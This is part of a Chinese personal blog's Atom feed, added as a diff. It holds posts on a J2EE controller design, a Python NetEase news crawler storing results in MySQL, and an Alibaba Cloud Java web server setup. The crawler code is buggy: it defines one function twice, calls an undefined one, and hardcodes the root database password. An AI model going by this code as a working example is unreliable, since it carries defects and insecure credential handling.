+<h2 id="三、实现过程中的问题："><a href="#三、实现过程中的问题：" class="headerlink" title="三、实现过程中的问题："></a>三、实现过程中的问题：</h2><h3 id="核心控制器如何知道要创建哪一个Action对象"><a href="#核心控制器如何知道要创建哪一个Action对象" class="headerlink" title="核心控制器如何知道要创建哪一个Action对象"></a>核心控制器如何知道要创建哪一个Action对象</h3><ol>
+<li>获取请求路径中的URI<br>例:<code>http:localhost:8080/test/login.action</code>，获取到<code>login</code></li>
+<li>编写xml将login和LoginAction相对应起来。</li>
+<li>在核心控制器中使用dom4j对xml解析，使用反射机制，创建LoginAction对象。</li>
+</ol>
+<h3 id="Action返回的URI固定，不便于维护修改"><a href="#Action返回的URI固定，不便于维护修改" class="headerlink" title="Action返回的URI固定，不便于维护修改"></a>Action返回的URI固定，不便于维护修改</h3><ol>
+<li>在Action中返回相应的标记（字符串，如”sucess“）。</li>
+<li>编写xml将标记和要跳转的页面对应起来，并指定跳转方式。</li>
+<li>在核心控制器中读取配置文件使用dom4j解析，根据返回值进行跳转。</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;一、对原有controller分析&quot;&gt;&lt;a href=&quot;#一、对原有controller分析&quot; class=&quot;headerlink&quot; title=&quot;一、对原有controller分析&quot;&gt;&lt;/a&gt;一、对原有controller分析&lt;/h2&gt;&lt;h3 id=&quot;过程：&quot;&gt;
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python3网易新闻爬虫</title>
+    <link href="http://jooop.github.io/2017/01/29/python3%E7%BD%91%E6%98%93%E7%88%AC%E8%99%AB/"/>
+    <id>http://jooop.github.io/2017/01/29/python3网易爬虫/</id>
+    <published>2017-01-29T05:06:05.000Z</published>
+    <updated>2017-02-17T14:21:40.575Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、背景："><a href="#一、背景：" class="headerlink" title="一、背景："></a>一、背景：</h2><p>　　因为另一项目新闻管理系统的需要，以及作为熟悉python基础的练手项目，现准备用python写一个网易新闻爬虫，为新闻管理系统项目获取新闻内容，以解决新闻源的自动获取、添加到数据库的问题。</p>
+<h2 id="二、目标："><a href="#二、目标：" class="headerlink" title="二、目标："></a>二、目标：</h2><p>　　实现自动化获取网易新闻不同类别的新闻列表url，然后分别爬取新闻内容并存入新闻管理系统项目的mysql数据库，以供新闻管理系统的使用。</p>
+<h2 id="三、参考："><a href="#三、参考：" class="headerlink" title="三、参考："></a>三、参考：</h2><p>　　因为对python的爬虫和html解析模块不是很了解，因此在写的过程中查阅参考了许多模块的教程和资料。另外对于html页面中的标签正则，经查阅后使用断言以解决。<br>　　具体的爬虫结构，链接和正文内容的解析与正则模式、数据存储表均为自己设计。</p>
+<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ol>
+<li>编写简单的网络爬虫 (python3.2)<br> <a href="http://blog.csdn.net/database_zbye/article/details/38826893" target="_blank" rel="external">http://blog.csdn.net/database_zbye/article/details/38826893</a></li>
+<li>Python requests模块学习笔记<br> <a href="http://www.cnblogs.com/tangdongchu/p/4229049.html" target="_blank" rel="external">http://www.cnblogs.com/tangdongchu/p/4229049.html</a></li>
+<li>采用beautifulsoup库 解析html页面<br> <a href="http://blog.csdn.net/weiyuanke/article/details/16986639" target="_blank" rel="external">http://blog.csdn.net/weiyuanke/article/details/16986639</a></li>
+<li>《零基础学python》（第二版）»第七章 保存数据 »MySQL数据库(2)<br> <a href="http://docs.pythontab.com/learnpython/231/" target="_blank" rel="external">http://docs.pythontab.com/learnpython/231/</a></li>
+<li>正则表达式分组、断言详解<br> <a href="http://www.cnblogs.com/iyangyuan/archive/2013/05/30/3107390.html" target="_blank" rel="external">http://www.cnblogs.com/iyangyuan/archive/2013/05/30/3107390.html</a></li>
+</ol>
+<h2 id="四、分析："><a href="#四、分析：" class="headerlink" title="四、分析："></a>四、分析：</h2><h3 id="（一）、新闻爬虫业务流程分析："><a href="#（一）、新闻爬虫业务流程分析：" class="headerlink" title="（一）、新闻爬虫业务流程分析："></a>（一）、新闻爬虫业务流程分析：</h3><ol>
+<li>爬取新闻列表的html页面,解析出新闻的url,存入队列。</li>
+<li>从队列中取出一个url,爬取新闻内容的html页面，进行解析，将解析出的标题、正文、来源、时间、图片等结果放入数据库。</li>
+</ol>
+<h3 id="（二）、实现过程中几个细节分析："><a href="#（二）、实现过程中几个细节分析：" class="headerlink" title="（二）、实现过程中几个细节分析："></a>（二）、实现过程中几个细节分析：</h3><h4 id="1-模块的选择和列表页面的爬取："><a href="#1-模块的选择和列表页面的爬取：" class="headerlink" title="1. 模块的选择和列表页面的爬取："></a>1. 模块的选择和列表页面的爬取：</h4><p>　　在看了一些入门文章后，开始打算使用requests模块爬取新闻列表和正文页面，然后使用BeautifulSoup加lxml对页面进行解析，在对网易新闻列表的加载方式经过一番研究后，通过浏览器的开发者工具提取到动态JS加载的新闻标题列表的JSON页面的链接，用手工提取不同分类的JSON链接地址，然后通过<strong>requests模块</strong>来获取页面。</p>
+<h4 id="2-提取新闻url："><a href="#2-提取新闻url：" class="headerlink" title="2. 提取新闻url："></a>2. 提取新闻url：</h4><p>　　对于列表地址的解析，因为没有了解过JSON数据的处理方式，为了方便起见使用了断言式正则规则来提取出新闻的url。</p>
+<h4 id="3-将url存入队列"><a href="#3-将url存入队列" class="headerlink" title="3. 将url存入队列"></a>3. 将url存入队列</h4><p>　　为了标识已经访问过的新闻链接，防止程序突然崩溃导致的队列数据丢失和简单的链接去重。<strong>使用数据库作为存放新闻页面链接的队列</strong>，titles表结构如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">字段名称</th>
+<th style="text-align:left">数据类型</th>
+<th style="text-align:left">Key</th>
+<th style="text-align:left">Default</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">url</td>
+<td style="text-align:left">varchar(100)</td>
+<td style="text-align:left">PRI</td>
+<td style="text-align:left">NULL</td>
+<td>存放新闻url</td>
+</tr>
+<tr>
+<td style="text-align:left">category</td>
+<td style="text-align:left">varchar(10)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>存放分类信息</td>
+</tr>
+<tr>
+<td style="text-align:left">flag</td>
+<td style="text-align:left">tinyint(4)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>标记是否获取过内容</td>
+</tr>
+</tbody>
+</table>
+<p>　　将url设置为主键，并且在存入新闻链接时使用<code>insert ignore into ...</code>语句来保证url不会重复，在<strong>新插入url的同时将flag设置为0，表示该页面待爬取</strong>。<br>在存入解析完的新闻数据的同时，将titles表中，相对应的url的flag设置为1，表示已经爬取过该页面。</p>
+<h4 id="4-获取新闻界面"><a href="#4-获取新闻界面" class="headerlink" title="4. 获取新闻界面"></a>4. 获取新闻界面</h4><p>　　同第一步中获取新闻列表界面一样，直接使用requests模块获取页面。因此直接调用其函数。</p>
+<h4 id="5-解析新闻界面"><a href="#5-解析新闻界面" class="headerlink" title="5. 解析新闻界面"></a>5. 解析新闻界面</h4><p>　　对于新闻内容的提取用到了<code>BeautifulSoup</code>模块和正则表达式混合进行解析。另外因为网易新闻有些html样式不统一，此处<strong>解析只针对占主流的页面样式</strong>，对于无法解析的页面进行提示并标记。<br>　　另外因为考虑到新闻管理系统需要取出新闻正文，再输出到html界面进行展示，因此对新闻正文的html标签没有使用正则去除、而是原样式保存到数据库。</p>
+<h4 id="6-将解析出的数据存入数据库，同时对已获取内容的url标记"><a href="#6-将解析出的数据存入数据库，同时对已获取内容的url标记" class="headerlink" title="6. 将解析出的数据存入数据库，同时对已获取内容的url标记"></a>6. 将解析出的数据存入数据库，同时对已获取内容的url标记</h4><p>　　将成功解析的数据存入<code>news表</code>中，并将<code>titles表</code>相对应的url的flag设置为1，表示已经获取过该新闻内容。此处遇到过正文、来源等数据长度超过数据库的表字段长度，导致程序中断的问题，对此解决方法是在执行该插入操作时捕获异常，然后对该新闻的url进行flag标记设置为2，跳过此新闻的获取。<br>　　将内容格式无法解析的url的flag设置为2，表示已经试图爬取过该页面内容，但是无法获取该新闻。<br>　　news表结构如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">字段名称</th>
+<th style="text-align:left">数据类型</th>
+<th style="text-align:left">Key</th>
+<th style="text-align:left">Default</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">newsId</td>
+<td style="text-align:left">bigint(20)</td>
+<td style="text-align:left">PRI</td>
+<td style="text-align:left">NULL</td>
+<td>新闻ID</td>
+</tr>
+<tr>
+<td style="text-align:left">title</td>
+<td style="text-align:left">varchar(40)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>标题</td>
+</tr>
+<tr>
+<td style="text-align:left">content</td>
+<td style="text-align:left">text</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>正文</td>
+</tr>
+<tr>
+<td style="text-align:left">imageUrl</td>
+<td style="text-align:left">varchar(180)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>首个图片地址（做封面）</td>
+</tr>
+<tr>
+<td style="text-align:left">date</td>
+<td style="text-align:left">timestamp</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">CURRENT_TIMESTAMP</td>
+<td>日期</td>
+</tr>
+<tr>
+<td style="text-align:left">source</td>
+<td style="text-align:left">varchar(50)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>来源</td>
+</tr>
+<tr>
+<td style="text-align:left">clickTraffic</td>
+<td style="text-align:left">bigint(20)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">0</td>
+<td>点击量</td>
+</tr>
+<tr>
+<td style="text-align:left">category</td>
+<td style="text-align:left">varchar(10)</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">NULL</td>
+<td>分类</td>
+</tr>
+</tbody>
+</table>
+<h2 id="五、开发："><a href="#五、开发：" class="headerlink" title="五、开发："></a>五、开发：</h2><h3 id="（一）、开发环境及工具配置："><a href="#（一）、开发环境及工具配置：" class="headerlink" title="（一）、开发环境及工具配置："></a>（一）、开发环境及工具配置：</h3><p>　　开发环境：windows10<br>　　开发语言：python3.5<br>　　开发工具：IDEL、MySql5.7<br>　　使用模块：BeautifulSoup、requests、lxml、pymysql</p>
+<h3 id="（二）、建表语句："><a href="#（二）、建表语句：" class="headerlink" title="（二）、建表语句："></a>（二）、建表语句：</h3><p>　　title表：<br>　　<code>create table titles(
+　　url varchar(100) primary key,
+　　category varchar(10),
+　　flag tinyint not null default 0
+　　);</code><br>　　news表：<br>　　<code>create table news(
+　　newsId bigint primary key auto_increment,
+　　title varchar(40),
+　　content text,
+　　imageUrl varchar(180),
+　　date timestamp,
+　　source varchar(50),
+　　clickTraffic bigint default 0,
+　　category varchar(10)
+　　);</code></p>
+<h3 id="（三）、源码："><a href="#（三）、源码：" class="headerlink" title="（三）、源码："></a>（三）、源码：</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python3</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> lxml</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> pymysql</div><div class="line"></div><div class="line"><span class="keyword">import</span> warnings</div><div class="line">warnings.filterwarnings(<span class="string">"ignore"</span>)</div><div class="line"></div><div class="line"><span class="comment">#获取html页面</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">GetPage</span><span class="params">(url)</span>:</span></div><div class="line">	    headers=&#123;</div><div class="line">	            <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36'</span></div><div class="line">	            &#125;</div><div class="line">	    data=requests.get(url,headers=headers)</div><div class="line">	    <span class="keyword">return</span> data</div><div class="line">	</div><div class="line">	<span class="comment">#解析ListPage，返回新闻列表的链接</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">TakenList</span><span class="params">(page)</span>:</span></div><div class="line">	    href=re.compile(<span class="string">r'(?&lt;="docurl":").*(?=",)'</span>) </div><div class="line">	    urls=href.findall(page.text)<span class="comment">#新闻列表的href正则规则</span></div><div class="line">	    <span class="keyword">return</span> urls</div><div class="line">	</div><div class="line">	<span class="comment">#将新闻url添加到数据库中</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">UseSql</span><span class="params">(urls,category)</span>:</span></div><div class="line">	    conn = pymysql.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"news"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</div><div class="line">	    cur = conn.cursor() <span class="comment">#利用连接对象得到游标对象</span></div><div class="line">	    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">	        cur.execute(<span class="string">"insert ignore into titles (url,category) values (%s,%s)"</span>,(url,category))<span class="comment">#此句行过程中，若数据库中已经存在目标utl，则不进行存储，并抛出一条警告</span></div><div class="line">	    conn.commit()</div><div class="line">	    cur.close()</div><div class="line">	    conn.close()</div><div class="line">	</div><div class="line">	<span class="comment">#获取数据库中flag为0的url，返回urls[]</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">GetSql</span><span class="params">()</span>:</span></div><div class="line">	    conn = pymysql.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"news"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</div><div class="line">	    cur = conn.cursor() <span class="comment">#利用连接对象得到游标对象</span></div><div class="line">	    cur.execute(<span class="string">"select url,category from titles where flag=0"</span>)</div><div class="line">	    lines=cur.fetchall()</div><div class="line">	    cur.close()</div><div class="line">	    conn.close()</div><div class="line">	    <span class="keyword">return</span> lines</div><div class="line">	</div><div class="line">	</div><div class="line">	<span class="comment">#解析NewsPage</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">TakenNews</span><span class="params">(data)</span>:</span></div><div class="line">	    mdict=&#123;&#125;</div><div class="line">	    soup=BeautifulSoup(data.text,<span class="string">'lxml'</span>)</div><div class="line">	    div1=soup.find(<span class="string">'div'</span>,class_=<span class="string">'post_content_main'</span>)</div><div class="line">	    <span class="keyword">if</span> repr(div1)!=<span class="string">"None"</span>:</div><div class="line">	        title=div1.find(<span class="string">'h1'</span>).text<span class="comment">#【标题】</span></div><div class="line">	        post_time_source=div1.find(<span class="string">'div'</span>,class_=<span class="string">'post_time_source'</span>).text</div><div class="line">	        <span class="comment">#(post_time_source需要再分别正则出时间和来源)</span></div><div class="line">	        opbody=div1.find(<span class="string">'div'</span>,class_=<span class="string">'post_text'</span>)</div><div class="line">	        <span class="comment">#(body需要再除去&lt;div style="position:relative;"&gt;....&lt;/div&gt;)</span></div><div class="line">	        image=opbody.find(<span class="string">"img"</span>)<span class="comment">#因为需要在新闻系统列表上显示图片，所以需要一条图片地址</span></div><div class="line">	        <span class="comment">#(需要再正则出src内容)</span></div><div class="line">	        time=re.search(<span class="string">r'\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;\:\d&#123;2&#125;'</span>,post_time_source).group(<span class="number">0</span>)<span class="comment">#匹配格式2016-11-19 22:14:05</span></div><div class="line">	        <span class="comment">#【时间】</span></div><div class="line">	        <span class="keyword">if</span> repr(re.search(<span class="string">r'来源.*'</span>,post_time_source))!=<span class="string">'None'</span>:</div><div class="line">	            source=re.search(<span class="string">r'来源.*'</span>,post_time_source).group(<span class="number">0</span>).strip()</div><div class="line">	            source=<span class="string">' '</span>.join(source.split())</div><div class="line">	        <span class="keyword">else</span>:</div><div class="line">	            source=<span class="string">'网易新闻'</span></div><div class="line">	        <span class="comment">#【来源】</span></div><div class="line">	        body=re.sub(<span class="string">r'\n'</span>,<span class="string">''</span>,repr(opbody))</div><div class="line">	        body=re.sub(<span class="string">r'&lt;div class="gg200x300"&gt;(.*?)&lt;/div&gt;&lt;/div&gt;'</span>,<span class="string">''</span>,body)</div><div class="line">	        <span class="comment">#【内容】</span></div><div class="line">	        <span class="keyword">if</span> repr(image)!=<span class="string">'None'</span>: <span class="comment">#若该新闻没有image，则将image标记为0</span></div><div class="line">	            image=re.sub(<span class="string">r'data-src|data-origin-src'</span>,<span class="string">''</span>,repr(image))    <span class="comment">#删除掉微信图片地址</span></div><div class="line">	            image=re.search(<span class="string">r'(?&lt;=src=")http:(.*?)(?=")'</span>,image).group(<span class="number">0</span>)</div><div class="line">	        <span class="keyword">else</span>:</div><div class="line">	            image=<span class="number">0</span></div><div class="line">	        <span class="comment">#【image的url】</span></div><div class="line">	        mdict[<span class="string">'解析状态'</span>]=<span class="string">"成功解析"</span></div><div class="line">	        mdict[<span class="string">'title'</span>]=title</div><div class="line">	        mdict[<span class="string">'time'</span>]=time</div><div class="line">	        mdict[<span class="string">'source'</span>]=source</div><div class="line">	        mdict[<span class="string">'body'</span>]=body</div><div class="line">	        mdict[<span class="string">'image'</span>]=image</div><div class="line">	    <span class="keyword">else</span>:</div><div class="line">	        mdict[<span class="string">'解析状态'</span>]=<span class="string">"无法解析"</span></div><div class="line">	    <span class="keyword">return</span> mdict</div><div class="line">	</div><div class="line">	<span class="comment">#将新闻数据存入数据库，同时将title的flag设为1</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">Putsql</span><span class="params">(mdict,category,purl)</span>:</span></div><div class="line">	    conn = pymysql.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"news"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</div><div class="line">	    cur = conn.cursor()</div><div class="line">	    cur.execute(<span class="string">"insert into news (title,date,source,imageUrl,content,category) values (%s,%s,%s,%s,%s,%s)"</span>,</div><div class="line">	                    (mdict[<span class="string">'title'</span>],mdict[<span class="string">'time'</span>],mdict[<span class="string">'source'</span>],mdict[<span class="string">'image'</span>],mdict[<span class="string">'body'</span>],category))</div><div class="line">	    cur.execute(<span class="string">"update titles set flag=1 where url=%s"</span>,(purl))</div><div class="line">	    conn.commit()</div><div class="line">	    cur.close()</div><div class="line">	    conn.close()</div><div class="line">	    print(<span class="string">"成功添加新闻"</span>,mdict[<span class="string">'title'</span>],<span class="string">"\n"</span>)</div><div class="line">	</div><div class="line">	<span class="comment">#无法解析的页面，将其忽略掉，同时将title的flag设为2</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">Putsql</span><span class="params">(mdict,category,purl)</span>:</span></div><div class="line">    conn = pymysql.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"news"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</div><div class="line">    cur = conn.cursor()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        cur.execute(<span class="string">"insert into news (title,date,source,imageUrl,content,category) values (%s,%s,%s,%s,%s,%s)"</span>,</div><div class="line">                        (mdict[<span class="string">'title'</span>],mdict[<span class="string">'time'</span>],mdict[<span class="string">'source'</span>],mdict[<span class="string">'image'</span>],mdict[<span class="string">'body'</span>],category))</div><div class="line">        cur.execute(<span class="string">"update titles set flag=1 where url=%s"</span>,(purl))</div><div class="line">        conn.commit()</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        cur.execute(<span class="string">"update titles set flag=2 where url=%s"</span>,(purl))</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">	    cur.close()</div><div class="line">	    conn.close()</div><div class="line">	    print(<span class="string">"成功添加新闻"</span>,mdict[<span class="string">'title'</span>],<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#main</span></div><div class="line">count=<span class="number">0</span></div><div class="line">NewsCategory=&#123;<span class="string">'国内'</span>:<span class="string">'http://temp.163.com/special/00804KVA/cm_guonei.js?callback=data_callback'</span>,</div><div class="line">        <span class="string">'国际'</span>:<span class="string">'http://temp.163.com/special/00804KVA/cm_guoji.js?callback=data_callback'</span>,</div><div class="line">	<span class="string">'社会'</span>:<span class="string">'http://temp.163.com/special/00804KVA/cm_shehui.js?callback=data_callback'</span>,</div><div class="line">	<span class="string">'军事'</span>:<span class="string">'http://temp.163.com/special/00804KVA/cm_war.js?callback=data_callback'</span>,</div><div class="line">	<span class="string">'体育'</span>:<span class="string">'http://sports.163.com/special/000587PR/newsdata_n_world.js?callback=data_callback'</span>,</div><div class="line">	<span class="string">'娱乐'</span>:<span class="string">'http://ent.163.com/special/000380VU/newsdata_index.js?callback=data_callback'</span>,</div><div class="line">	<span class="string">'科技'</span>:<span class="string">'http://tech.163.com/special/00097UHL/tech_datalist.js?callback=data_callback'</span></div><div class="line">          &#125;</div><div class="line"><span class="keyword">for</span> category <span class="keyword">in</span> NewsCategory:</div><div class="line">    print(<span class="string">"正在获取"</span>+category+<span class="string">"新闻列表"</span>)</div><div class="line">    category_url=NewsCategory[category]</div><div class="line">    listpage=GetPage(category_url)   <span class="comment">#获取标题列表页面</span></div><div class="line">    listurls=TakenList(listpage)            <span class="comment">#解析出标题列表数据</span></div><div class="line">    UseSql(listurls,category)                        <span class="comment">#将列表放入数据库</span></div><div class="line">    print(category+<span class="string">"列表更新完成，开始获取新闻"</span>)</div><div class="line">    pageurls=GetSql()                       <span class="comment">#从数据库获取未访问过的列表</span></div><div class="line">     <span class="comment">#依次访问这些列表</span></div><div class="line">    <span class="keyword">for</span> pageurl <span class="keyword">in</span> pageurls:               </div><div class="line">        purl=<span class="string">''</span>.join(list(pageurl[<span class="number">0</span>]))      <span class="comment">#取出新闻地址</span></div><div class="line">        pcategory=<span class="string">''</span>.join(list(pageurl[<span class="number">1</span>]))<span class="comment">#取出新闻类型</span></div><div class="line">        newspage=GetPage(purl)                  <span class="comment">#获取新闻内容页面</span></div><div class="line">        mdict=TakenNews(newspage)                   <span class="comment">#解析出标题、内容等信息</span></div><div class="line">        <span class="keyword">if</span> mdict[<span class="string">'解析状态'</span>]==<span class="string">"成功解析"</span>:</div><div class="line">            Putsql(mdict,pcategory,purl,)</div><div class="line">            count=count+<span class="number">1</span></div><div class="line">        <span class="keyword">elif</span> mdict[<span class="string">'解析状态'</span>]==<span class="string">"无法解析"</span>:</div><div class="line">            Delsql(purl)</div><div class="line">            print(<span class="string">"无法解析页面："</span>+purl+<span class="string">"，已跳过"</span>)</div><div class="line">print(<span class="string">'本次新闻获取已完成，共更新"'</span>+repr(count)+<span class="string">'"条新闻。'</span>)</div></pre></td></tr></table></figure>
+<h2 id="六、测试："><a href="#六、测试：" class="headerlink" title="六、测试："></a>六、测试：</h2><h3 id="（一）、本地运行测试："><a href="#（一）、本地运行测试：" class="headerlink" title="（一）、本地运行测试："></a>（一）、本地运行测试：</h3><ol>
+<li>运行环境：win10、python3.5</li>
+<li>运行效果：<br>成功添加新闻和此次获取数目统计<br><img src="./获取成功和统计.PNG" alt="Alt text"><br>　　对无法解析的页面将flag设置为2，跳过<br><img src="./对无法解析的进行跳过处理.PNG" alt="Alt text"></li>
+</ol>
+<h3 id="（二）、服务器定时运行测试："><a href="#（二）、服务器定时运行测试：" class="headerlink" title="（二）、服务器定时运行测试："></a>（二）、服务器定时运行测试：</h3><ol>
+<li><p>运行环境：centos6.5、python3.5</p>
+</li>
+<li><p>每小时定时运行设置：<br> 　　通过linux自带定时运行服务crontab进行设置，每小时自动运行。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">[root@iZm5e19ccp2hp43c52aze2Z ~]<span class="comment"># crontab -l</span></div><div class="line"><span class="comment">#!/bin/sh</span></div><div class="line"><span class="number">0</span> */<span class="number">1</span> * * * /usr/local/python3/bin/python3 /usr/local/news.py</div></pre></td></tr></table></figure>
+</li>
+<li><p>运行效果：<br>　　因定时运行服务不在控制台输出信息，<strong>效果可从网站前台页面查看：<a href="http://115.28.137.1:8080/" target="_blank" rel="external">http://115.28.137.1:8080/</a></strong>，每个小时整点与网易新闻同步更新。</p>
+<h2 id="七、工作评价："><a href="#七、工作评价：" class="headerlink" title="七、工作评价："></a>七、工作评价：</h2><p>　　此次开发为首次接触爬虫、也是首次实现完整的python程序，因此在爬虫结构设计、代码的实现上显得不够简洁、扩展性较差，对于细节的处理不够到位，对于另外一种新闻正文的页面形式没有进行解析而是直接跳过（此页面下多为自媒体投稿，新闻质量较差，所以没有考虑另外解析）。<br>　　每日新闻数据量较少、并且在使用的过程中没有出现反爬虫等情况，因此没有考虑多线程和使用代理IP优化。<br>　　因为对java的jdbc较为熟悉，所以在使用pymysql对数据库操作时比较顺利。<br>　　总的来说，此次项目仅为熟悉python的练手项目，并且项目目的只为了在自己的项目中使用，所以只做了主要功能的实现。</p>
+</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;一、背景：&quot;&gt;&lt;a href=&quot;#一、背景：&quot; class=&quot;headerlink&quot; title=&quot;一、背景：&quot;&gt;&lt;/a&gt;一、背景：&lt;/h2&gt;&lt;p&gt;　　因为另一项目新闻管理系统的需要，以及作为熟悉python基础的练手项目，现准备用python写一个网易新闻爬虫，
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://jooop.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>阿里云配置java web环境</title>
+    <link href="http://jooop.github.io/2017/01/29/%E9%98%BF%E9%87%8C%E4%BA%91%E9%85%8D%E7%BD%AEjava-web%E7%8E%AF%E5%A2%83/"/>
+    <id>http://jooop.github.io/2017/01/29/阿里云配置java-web环境/</id>
+    <published>2017-01-29T04:42:19.000Z</published>
+    <updated>2017-01-29T05:17:17.635Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="阿里云配置java-web环境"><a href="#阿里云配置java-web环境" class="headerlink" title="阿里云配置java web环境"></a>阿里云配置java web环境</h1><h2 id="一、服务器配置"><a href="#一、服务器配置" class="headerlink" title="一、服务器配置"></a>一、服务器配置</h2><p>centos 6.5</p>
+<h2 id="二、远程连接软件"><a href="#二、远程连接软件" class="headerlink" title="二、远程连接软件"></a>二、远程连接软件</h2><p>Xshell 5和Xftp 5</p>
+<h2 id="三、开始"><a href="#三、开始" class="headerlink" title="三、开始"></a>三、开始</h2><ol>
+<li>使用Xshell链接到阿里云</li>
+</ol>
+<h2 id="四、安装jdk1-7"><a href="#四、安装jdk1-7" class="headerlink" title="四、安装jdk1.7"></a>四、安装jdk1.7</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line">[root@iZm5e19ccp2hp43c52aze2Z ~]<span class="comment"># yum search jdk</span></div><div class="line">[root@iZm5e19ccp2hp43c52aze2Z ~]<span class="comment"># yum -y install  java-1.7.0-openjdk*</span></div></pre></td></tr></table></figure>
+<h2 id="五、安装tomcat8"><a href="#五、安装tomcat8" class="headerlink" title="五、安装tomcat8"></a>五、安装tomcat8</h2><p><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="external">官网</a>下载<code>8.0.39</code>的<code>tar.gz</code><br>使用Xftp上传至阿里云<br>将apache-tomcat-8.0.0.RC3.tar.gz文件上传到/usr/local中执行以下操作：</p>
+<p>代码如下:<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[root@localhost ~]# cd /usr/local</div><div class="line">[root@localhost ~]# tar -zxv -f apache-tomcat-8.0.39.tar.gz // 解压压缩包</div><div class="line">[root@localhost ~]# rm -rf apache-tomcat-8.0.39.tar.gz // 删除压缩包</div><div class="line">[root@localhost ~]# mv apache-tomcat-8.0.39 tomcat</div><div class="line"></div><div class="line">启动Tomcat</div><div class="line">执行以下操作：</div><div class="line">[root@localhost ~]# /usr/local/tomcat/bin/startup.sh //启动tomcat</div><div class="line">Using CATALINA_BASE:  /usr/local/tomcat</div><div class="line">Using CATALINA_HOME:  /usr/local/tomcat</div><div class="line">Using CATALINA_TMPDIR: /usr/local/tomcat/temp</div><div class="line">Using JRE_HOME:        /usr/java/jdk1.7.0_45/jre</div><div class="line">Using CLASSPATH:      /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar</div><div class="line">出现以上信息说明已成功启动。</div></pre></td></tr></table></figure></p>
+<p>检验Tomcat安装运行<br>通过以下地址查看tomcat是否运行正常：<br><a href="http://（阿里云的外网IP）:8080/" target="_blank" rel="external">http://（阿里云的外网IP）:8080/</a><br>看到tomcat系统界面，说明安装成功！</p>
+<p>停止Tomcat<br>[root@localhost ~]#  /usr/local/tomcat/bin/shutdown.sh  //停止tomcat</p>
+<h2 id="六、安装Mysql5-7"><a href="#六、安装Mysql5-7" class="headerlink" title="六、安装Mysql5.7"></a>六、安装Mysql5.7</h2><ol>
+<li><p><code>rpm -qa|grep mysql</code>查看是否安装有mysql，若有通过<code>rpm -e mysql-libs --nodeps</code>卸载</p>
+</li>
+<li><p>安装mysql yum源<code>wget http://repo.mysql.com//mysql57-community-release-el6-9.noarch.rpm</code><br>（从官网<a href="http://dev.mysql.com/downloads/repo/yum/查看mysql最新的yum源的rpm安装包）" target="_blank" rel="external">http://dev.mysql.com/downloads/repo/yum/查看mysql最新的yum源的rpm安装包）</a></p>
+</li>
+<li><p>使用yum安装rpm包<br><code>yum install mysql57-community-release-el6-9.noarch.rpm</code></p>
+</li>
